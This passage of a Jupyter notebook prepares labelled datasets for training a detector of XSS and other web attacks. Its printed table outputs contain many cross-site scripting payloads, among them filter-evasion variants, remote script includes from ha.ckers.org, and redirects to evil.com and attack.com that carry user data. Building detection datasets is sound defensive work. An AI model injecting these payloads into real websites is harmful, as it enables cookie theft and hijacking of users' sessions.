       "    <tr>\n",
       "      <th>496</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>497</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>498</th>\n",
       "      <td>window.location.href = 'http://attack.com?user...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>499</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>500 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                               payload  xss\n",
       "0                        alert('Hello ' + user_input);    1\n",
       "1    document.location = 'http://evil.com?username=...    1\n",
       "2    document.location = 'http://evil.com?username=...    1\n",
       "3    document.getElementById('input').innerHTML = u...    1\n",
       "4                        alert('Hello ' + user_input);    1\n",
       "..                                                 ...  ...\n",
       "495  document.getElementById('input').innerHTML = u...    1\n",
       "496  document.location = 'http://evil.com?username=...    1\n",
       "497                      alert('Hello ' + user_input);    1\n",
       "498  window.location.href = 'http://attack.com?user...    1\n",
       "499                      alert('Hello ' + user_input);    1\n",
       "\n",
       "[500 rows x 2 columns]"
      ]
     },
     "execution_count": 745,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_code_vul[\"xss\"] = xss_code_vul['xss'].apply(lambda x: 1 if x == \"XSS\" else 0)\n",
    "xss_code_vul"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 746,
   "metadata": {},
   "outputs": [],
   "source": [
    "xss_code_vul.to_csv(\"../Datasets/Processed/xss_code_vul.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Payload Full csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 747,
   "metadata": {},
   "outputs": [],
   "source": [
    "pf = pd.read_csv(\"../Datasets/payload_full.csv\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 748,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "length",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "attack_type",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "label",
         "rawType": "object",
         "type": "string"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "adf4037f-26ea-413b-a6a8-148955ff4871",
       "rows": [
        [
         "0",
         "c/ caridad s/n",
         "14",
         "norm",
         "norm"
        ],
        [
         "1",
         "campello, el",
         "12",
         "norm",
         "norm"
        ],
        [
         "2",
         "40184",
         "5",
         "norm",
         "norm"
        ],
        [
         "3",
         "1442431887503330",
         "16",
         "norm",
         "norm"
        ],
        [
         "4",
         "nue37",
         "5",
         "norm",
         "norm"
        ],
        [
         "5",
         "nuda drudes",
         "11",
         "norm",
         "norm"
        ],
        [
         "6",
         "tufts3@joll.rs",
         "14",
         "norm",
         "norm"
        ],
        [
         "7",
         "22997112x",
         "9",
         "norm",
         "norm"
        ],
        [
         "8",
         "c/ del ferrocarril, 152,",
         "24",
         "norm",
         "norm"
        ],
        [
         "9",
         "arenas de san juan",
         "18",
         "norm",
         "norm"
        ],
        [
         "10",
         "19245",
         "5",
         "norm",
         "norm"
        ],
        [
         "11",
         "2070765320009143",
         "16",
         "norm",
         "norm"
        ],
        [
         "12",
         "fennell",
         "7",
         "norm",
         "norm"
        ],
        [
         "13",
         "d50allecido",
         "11",
         "norm",
         "norm"
        ],
        [
         "14",
         "1902",
         "4",
         "norm",
         "norm"
        ],
        [
         "15",
         "genny",
         "5",
         "norm",
         "norm"
        ],
        [
         "16",
         "03248i367ca",
         "11",
         "norm",
         "norm"
        ],
        [
         "17",
         "ulldemol bujeque",
         "16",
         "norm",
         "norm"
        ],
        [
         "18",
         "grubel8@albeiteria.kw",
         "21",
         "norm",
         "norm"
        ],
        [
         "19",
         "83497200r",
         "9",
         "norm",
         "norm"
        ],
        [
         "20",
         "plaa caudillo 60",
         "16",
         "norm",
         "norm"
        ],
        [
         "21",
         "martn de yeltes",
         "15",
         "norm",
         "norm"
        ],
        [
         "22",
         "1769471856078209",
         "16",
         "norm",
         "norm"
        ],
        [
         "23",
         "maala8",
         "6",
         "norm",
         "norm"
        ],
        [
         "24",
         "cascabela",
         "9",
         "norm",
         "norm"
        ],
        [
         "25",
         "ludolfo",
         "7",
         "norm",
         "norm"
        ],
        [
         "26",
         "peuela sains",
         "12",
         "norm",
         "norm"
        ],
        [
         "27",
         "snerd@bwds.tj",
         "13",
         "norm",
         "norm"
        ],
        [
         "28",
         "15365381r",
         "9",
         "norm",
         "norm"
        ],
        [
         "29",
         "c/ 57 15, 9g",
         "12",
         "norm",
         "norm"
        ],
        [
         "30",
         "regueras de arriba",
         "18",
         "norm",
         "norm"
        ],
        [
         "31",
         "08281",
         "5",
         "norm",
         "norm"
        ],
        [
         "32",
         "empeltre",
         "8",
         "norm",
         "norm"
        ],
        [
         "33",
         "7497",
         "4",
         "norm",
         "norm"
        ],
        [
         "34",
         "mckenney",
         "8",
         "norm",
         "norm"
        ],
        [
         "35",
         "estantalar",
         "10",
         "norm",
         "norm"
        ],
        [
         "36",
         "poma gozalbo",
         "12",
         "norm",
         "norm"
        ],
        [
         "37",
         "loti@ajuntamentbarcelona2-0.is",
         "30",
         "norm",
         "norm"
        ],
        [
         "38",
         "21924971z",
         "9",
         "norm",
         "norm"
        ],
        [
         "39",
         "c/ huertas altas, 114",
         "21",
         "norm",
         "norm"
        ],
        [
         "40",
         "sequera de haza, la",
         "19",
         "norm",
         "norm"
        ],
        [
         "41",
         "25260",
         "5",
         "norm",
         "norm"
        ],
        [
         "42",
         "8755728520539974",
         "16",
         "norm",
         "norm"
        ],
        [
         "43",
         "kindra",
         "6",
         "norm",
         "norm"
        ],
        [
         "44",
         "h9655",
         "5",
         "norm",
         "norm"
        ],
        [
         "45",
         "josias",
         "6",
         "norm",
         "norm"
        ],
        [
         "46",
         "fonoll zurko",
         "12",
         "norm",
         "norm"
        ],
        [
         "47",
         "dunlap-leaud@videospornocaseros.ye",
         "34",
         "norm",
         "norm"
        ],
        [
         "48",
         "07408152j",
         "9",
         "norm",
         "norm"
        ],
        [
         "49",
         "c/ aira de villaescusa 199, 1f",
         "30",
         "norm",
         "norm"
        ]
       ],
       "shape": {
        "columns": 4,
        "rows": 31067
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>length</th>\n",
       "      <th>attack_type</th>\n",
       "      <th>label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>c/ caridad s/n</td>\n",
       "      <td>14</td>\n",
       "      <td>norm</td>\n",
       "      <td>norm</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>campello, el</td>\n",
       "      <td>12</td>\n",
       "      <td>norm</td>\n",
       "      <td>norm</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>40184</td>\n",
       "      <td>5</td>\n",
       "      <td>norm</td>\n",
       "      <td>norm</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1442431887503330</td>\n",
       "      <td>16</td>\n",
       "      <td>norm</td>\n",
       "      <td>norm</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>nue37</td>\n",
       "      <td>5</td>\n",
       "      <td>norm</td>\n",
       "      <td>norm</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31062</th>\n",
       "      <td>&lt;script a=\"&gt;\" id=xss src=\"http://ha.ckers.org/...</td>\n",
       "      <td>63</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31063</th>\n",
       "      <td>&lt;script a=\"&gt;\" '' id=xss src=\"http://ha.ckers.o...</td>\n",
       "      <td>66</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31064</th>\n",
       "      <td>&lt;script \"a='&gt;'\" id=xss src=\"http://ha.ckers.or...</td>\n",
       "      <td>65</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31065</th>\n",
       "      <td>&lt;script a=`&gt;` id=xss src=\"http://ha.ckers.org/...</td>\n",
       "      <td>63</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31066</th>\n",
       "      <td>&lt;script&gt;document.write(\"&lt;scri\");&lt;/script&gt;pt id...</td>\n",
       "      <td>93</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>31067 rows × 4 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 payload  length attack_type  \\\n",
       "0                                         c/ caridad s/n      14        norm   \n",
       "1                                           campello, el      12        norm   \n",
       "2                                                  40184       5        norm   \n",
       "3                                       1442431887503330      16        norm   \n",
       "4                                                  nue37       5        norm   \n",
       "...                                                  ...     ...         ...   \n",
       "31062  <script a=\">\" id=xss src=\"http://ha.ckers.org/...      63         xss   \n",
       "31063  <script a=\">\" '' id=xss src=\"http://ha.ckers.o...      66         xss   \n",
       "31064  <script \"a='>'\" id=xss src=\"http://ha.ckers.or...      65         xss   \n",
       "31065  <script a=`>` id=xss src=\"http://ha.ckers.org/...      63         xss   \n",
       "31066  <script>document.write(\"<scri\");</script>pt id...      93         xss   \n",
       "\n",
       "      label  \n",
       "0      norm  \n",
       "1      norm  \n",
       "2      norm  \n",
       "3      norm  \n",
       "4      norm  \n",
       "...     ...  \n",
       "31062  anom  \n",
       "31063  anom  \n",
       "31064  anom  \n",
       "31065  anom  \n",
       "31066  anom  \n",
       "\n",
       "[31067 rows x 4 columns]"
      ]
     },
     "execution_count": 748,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 749,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 31067 entries, 0 to 31066\n",
      "Data columns (total 4 columns):\n",
      " #   Column       Non-Null Count  Dtype \n",
      "---  ------       --------------  ----- \n",
      " 0   payload      31067 non-null  object\n",
      " 1   length       31067 non-null  int64 \n",
      " 2   attack_type  31067 non-null  object\n",
      " 3   label        31067 non-null  object\n",
      "dtypes: int64(1), object(3)\n",
      "memory usage: 971.0+ KB\n"
     ]
    }
   ],
   "source": [
    "pf.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 750,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "length",
         "rawType": "float64",
         "type": "float"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "f40665fa-696c-4606-b740-f907fcdca633",
       "rows": [
        [
         "count",
         "31067.0"
        ],
        [
         "mean",
         "41.1471336144462"
        ],
        [
         "std",
         "56.231627743438445"
        ],
        [
         "min",
         "1.0"
        ],
        [
         "25%",
         "8.0"
        ],
        [
         "50%",
         "16.0"
        ],
        [
         "75%",
         "54.0"
        ],
        [
         "max",
         "1058.0"
        ]
       ],
       "shape": {
        "columns": 1,
        "rows": 8
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>length</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>count</th>\n",
       "      <td>31067.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>mean</th>\n",
       "      <td>41.147134</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>std</th>\n",
       "      <td>56.231628</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>min</th>\n",
       "      <td>1.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25%</th>\n",
       "      <td>8.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>50%</th>\n",
       "      <td>16.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>75%</th>\n",
       "      <td>54.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>max</th>\n",
       "      <td>1058.000000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "             length\n",
       "count  31067.000000\n",
       "mean      41.147134\n",
       "std       56.231628\n",
       "min        1.000000\n",
       "25%        8.000000\n",
       "50%       16.000000\n",
       "75%       54.000000\n",
       "max     1058.000000"
      ]
     },
     "execution_count": 750,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pf.describe()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 751,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "attack_type\n",
       "norm              19304\n",
       "sqli              10852\n",
       "xss                 532\n",
       "path-traversal      290\n",
       "cmdi                 89\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 751,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pf[\"attack_type\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 752,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "label\n",
       "norm    19304\n",
       "anom    11763\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 752,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pf[\"label\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 753,
   "metadata": {},
   "outputs": [],
   "source": [
    "xss_pf = pf[pf[\"attack_type\"] == \"xss\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 754,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "length",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "attack_type",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "label",
         "rawType": "object",
         "type": "string"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "c7170322-ac7c-4e4c-a198-2523bef2eef2",
       "rows": [
        [
         "0",
         "confirm(2)>/",
         "12",
         "xss",
         "anom"
        ],
        [
         "1",
         "open()>",
         "7",
         "xss",
         "anom"
        ],
        [
         "2",
         "location=?javascript:alert(1)>click",
         "35",
         "xss",
         "anom"
        ],
        [
         "3",
         "<svg><script>alert(/1/)</script>",
         "32",
         "xss",
         "anom"
        ],
        [
         "4",
         "</script><script>alert(1)</script>",
         "34",
         "xss",
         "anom"
        ],
        [
         "5",
         "5rt(0);'>rhainfosec",
         "19",
         "xss",
         "anom"
        ],
        [
         "6",
         ">\"<img src=&{document.cookie=true;};>",
         "37",
         "xss",
         "anom"
        ],
        [
         "7",
         ">\"<img src=\"mocha:document.cookie=true;\">",
         "41",
         "xss",
         "anom"
        ],
        [
         "8",
         ">\"<img src=\"livescript:document.cookie=true;\">",
         "46",
         "xss",
         "anom"
        ],
        [
         "9",
         "\"data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4=\">",
         "69",
         "xss",
         "anom"
        ],
        [
         "10",
         "prompt(1);>",
         "11",
         "xss",
         "anom"
        ],
        [
         "11",
         "<body onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\"crosssitescripting\")>",
         "66",
         "xss",
         "anom"
        ],
        [
         "12",
         "<iframe src=http://vulnerability-lab.com/index.html <",
         "53",
         "xss",
         "anom"
        ],
        [
         "13",
         "<table background=\"javascript:alert('crosssitescripting')\">",
         "59",
         "xss",
         "anom"
        ],
        [
         "14",
         "<table><td background=\"javascript:alert('crosssitescripting')\">",
         "63",
         "xss",
         "anom"
        ],
        [
         "15",
         "<bgsound src=\"javascript:alert('crosssitescripting');\">",
         "55",
         "xss",
         "anom"
        ],
        [
         "16",
         "<br size=\"&{alert('crosssitescripting')}\">",
         "42",
         "xss",
         "anom"
        ],
        [
         "17",
         "<a href=\"http://server.com/\">crosssitescripting</a>",
         "51",
         "xss",
         "anom"
        ],
        [
         "18",
         "<a href=\"http://www.google.com\">crosssitescripting</a>",
         "54",
         "xss",
         "anom"
        ],
        [
         "19",
         "<a href=\"http://1113982867/\">crosssitescripting</a>",
         "51",
         "xss",
         "anom"
        ],
        [
         "20",
         "<a href=\"javascript:document.location='http://www.vulnerability-lab.com/'\">crosssitescripting</a>",
         "97",
         "xss",
         "anom"
        ],
        [
         "21",
         "<base href=\"javascript:alert('crosssitescripting');//\">",
         "55",
         "xss",
         "anom"
        ],
        [
         "22",
         "\";alert('crosssitescripting');//",
         "32",
         "xss",
         "anom"
        ],
        [
         "23",
         "<input type=\"image\" src=\"javascript:alert('crosssitescripting');\">",
         "66",
         "xss",
         "anom"
        ],
        [
         "24",
         "<crosssitescripting style=\"behavior: url(crosssitescripting.htc);\">",
         "67",
         "xss",
         "anom"
        ],
        [
         "25",
         "scriptalert(crosssitescripting)/script",
         "38",
         "xss",
         "anom"
        ],
        [
         "26",
         "<img style=\"crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))\">",
         "94",
         "xss",
         "anom"
        ],
        [
         "27",
         "<crosssitescripting style=\"crosssitescripting:expression(alert('crosssitescripting'))\"> exp/*<a style='no\\\\crosssitescripting:nocrosssitescripting(\"*//*\"); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert(\"crosssitescripting\"))'>",
         "242",
         "xss",
         "anom"
        ],
        [
         "28",
         "<html xmlns:crosssitescripting><?import namespace=\"crosssitescripting\" implementation=\"http://ha.ckers.org/crosssitescripting.htc\"><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>",
         "228",
         "xss",
         "anom"
        ],
        [
         "29",
         "<xml id=i><x><c><![cdata[<img src=\"javas]]><![cdata[cript:alert('crosssitescripting');\">]]>",
         "91",
         "xss",
         "anom"
        ],
        [
         "30",
         "</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",
         "66",
         "xss",
         "anom"
        ],
        [
         "31",
         "<xml id=\"crosssitescripting\"><i><b><img src=\"javas<!-- -->cript:alert('crosssitescripting')\"></b></i></xml>",
         "107",
         "xss",
         "anom"
        ],
        [
         "32",
         "<span datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"html\"></span>",
         "75",
         "xss",
         "anom"
        ],
        [
         "33",
         "<xml src=\"crosssitescriptingtest.xml\" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>",
         "101",
         "xss",
         "anom"
        ],
        [
         "34",
         "<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">",
         "63",
         "xss",
         "anom"
        ],
        [
         "35",
         "<?import namespace=\"t\" implementation=\"#default#time2\">",
         "55",
         "xss",
         "anom"
        ],
        [
         "36",
         "<t:set attributename=\"innerhtml\" to=\"crosssitescripting<script defer>alert(\"crosssitescripting\")</script>\">",
         "107",
         "xss",
         "anom"
        ],
        [
         "37",
         "</body></html>",
         "14",
         "xss",
         "anom"
        ],
        [
         "38",
         "<script src=\"http://vulnerability-lab.com/crosssitescripting.jpg\"></script>",
         "75",
         "xss",
         "anom"
        ],
        [
         "39",
         "<? echo('<scr)';echo('ipt>alert(\"crosssitescripting\")</script>'); ?>",
         "68",
         "xss",
         "anom"
        ],
        [
         "40",
         "<img src=\"http://www.vulnerability-lab.com/file.php?variables=malicious\">",
         "73",
         "xss",
         "anom"
        ],
        [
         "41",
         "<iframe src=http://test.de>",
         "27",
         "xss",
         "anom"
        ],
        [
         "42",
         "<body onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\"xss\")>",
         "51",
         "xss",
         "anom"
        ],
        [
         "43",
         "><img id=xss src=x onerror=alert(xss);>",
         "39",
         "xss",
         "anom"
        ],
        [
         "44",
         ";!--\"<xss>=&{()}\"",
         "17",
         "xss",
         "anom"
        ],
        [
         "45",
         "<img id=xss src=\"javascript:alert('xss');\">",
         "43",
         "xss",
         "anom"
        ],
        [
         "46",
         "<img id=xss src=javascript:alert('xss')>",
         "40",
         "xss",
         "anom"
        ],
        [
         "47",
         "<img id=xss src=javascript:alert(\"xss\")>",
         "40",
         "xss",
         "anom"
        ],
        [
         "48",
         "<img id=xss src=`javascript:alert(\"'xss'\")`>",
         "44",
         "xss",
         "anom"
        ],
        [
         "49",
         "<img id=xss src=\"jav ascript:alert('xss');\">",
         "44",
         "xss",
         "anom"
        ]
       ],
       "shape": {
        "columns": 4,
        "rows": 532
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>length</th>\n",
       "      <th>attack_type</th>\n",
       "      <th>label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>confirm(2)&gt;/</td>\n",
       "      <td>12</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>open()&gt;</td>\n",
       "      <td>7</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>location=?javascript:alert(1)&gt;click</td>\n",
       "      <td>35</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&lt;svg&gt;&lt;script&gt;alert(/1/)&lt;/script&gt;</td>\n",
       "      <td>32</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</td>\n",
       "      <td>34</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>527</th>\n",
       "      <td>&lt;script a=\"&gt;\" id=xss src=\"http://ha.ckers.org/...</td>\n",
       "      <td>63</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>528</th>\n",
       "      <td>&lt;script a=\"&gt;\" '' id=xss src=\"http://ha.ckers.o...</td>\n",
       "      <td>66</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>529</th>\n",
       "      <td>&lt;script \"a='&gt;'\" id=xss src=\"http://ha.ckers.or...</td>\n",
       "      <td>65</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>530</th>\n",
       "      <td>&lt;script a=`&gt;` id=xss src=\"http://ha.ckers.org/...</td>\n",
       "      <td>63</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>531</th>\n",
       "      <td>&lt;script&gt;document.write(\"&lt;scri\");&lt;/script&gt;pt id...</td>\n",
       "      <td>93</td>\n",
       "      <td>xss</td>\n",
       "      <td>anom</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>532 rows × 4 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                               payload  length attack_type  \\\n",
       "0                                         confirm(2)>/      12         xss   \n",
       "1                                              open()>       7         xss   \n",
       "2                  location=?javascript:alert(1)>click      35         xss   \n",
       "3                     <svg><script>alert(/1/)</script>      32         xss   \n",
       "4                   </script><script>alert(1)</script>      34         xss   \n",
       "..                                                 ...     ...         ...   \n",
       "527  <script a=\">\" id=xss src=\"http://ha.ckers.org/...      63         xss   \n",
       "528  <script a=\">\" '' id=xss src=\"http://ha.ckers.o...      66         xss   \n",
       "529  <script \"a='>'\" id=xss src=\"http://ha.ckers.or...      65         xss   \n",
       "530  <script a=`>` id=xss src=\"http://ha.ckers.org/...      63         xss   \n",
       "531  <script>document.write(\"<scri\");</script>pt id...      93         xss   \n",
       "\n",
       "    label  \n",
       "0    anom  \n",
       "1    anom  \n",
       "2    anom  \n",
       "3    anom  \n",
       "4    anom  \n",
       "..    ...  \n",
       "527  anom  \n",
       "528  anom  \n",
       "529  anom  \n",
       "530  anom  \n",
       "531  anom  \n",
       "\n",
       "[532 rows x 4 columns]"
      ]
     },
     "execution_count": 754,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_pf.reset_index(drop=True, inplace=True)\n",
    "xss_pf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 755,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/2159962223.py:2: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_pf.rename(columns={\"attack_type\": \"xss\"}, inplace=True)\n"
     ]
    },
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "object",
         "type": "string"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "d18d92c6-76cc-4f3a-9684-b0ece159974a",
       "rows": [
        [
         "0",
         "confirm(2)>/",
         "xss"
        ],
        [
         "1",
         "open()>",
         "xss"
        ],
        [
         "2",
         "location=?javascript:alert(1)>click",
         "xss"
        ],
        [
         "3",
         "<svg><script>alert(/1/)</script>",
         "xss"
        ],
        [
         "4",
         "</script><script>alert(1)</script>",
         "xss"
        ],
        [
         "5",
         "5rt(0);'>rhainfosec",
         "xss"
        ],
        [
         "6",
         ">\"<img src=&{document.cookie=true;};>",
         "xss"
        ],
        [
         "7",
         ">\"<img src=\"mocha:document.cookie=true;\">",
         "xss"
        ],
        [
         "8",
         ">\"<img src=\"livescript:document.cookie=true;\">",
         "xss"
        ],
        [
         "9",
         "\"data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4=\">",
         "xss"
        ],
        [
         "10",
         "prompt(1);>",
         "xss"
        ],
        [
         "11",
         "<body onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\"crosssitescripting\")>",
         "xss"
        ],
        [
         "12",
         "<iframe src=http://vulnerability-lab.com/index.html <",
         "xss"
        ],
        [
         "13",
         "<table background=\"javascript:alert('crosssitescripting')\">",
         "xss"
        ],
        [
         "14",
         "<table><td background=\"javascript:alert('crosssitescripting')\">",
         "xss"
        ],
        [
         "15",
         "<bgsound src=\"javascript:alert('crosssitescripting');\">",
         "xss"
        ],
        [
         "16",
         "<br size=\"&{alert('crosssitescripting')}\">",
         "xss"
        ],
        [
         "17",
         "<a href=\"http://server.com/\">crosssitescripting</a>",
         "xss"
        ],
        [
         "18",
         "<a href=\"http://www.google.com\">crosssitescripting</a>",
         "xss"
        ],
        [
         "19",
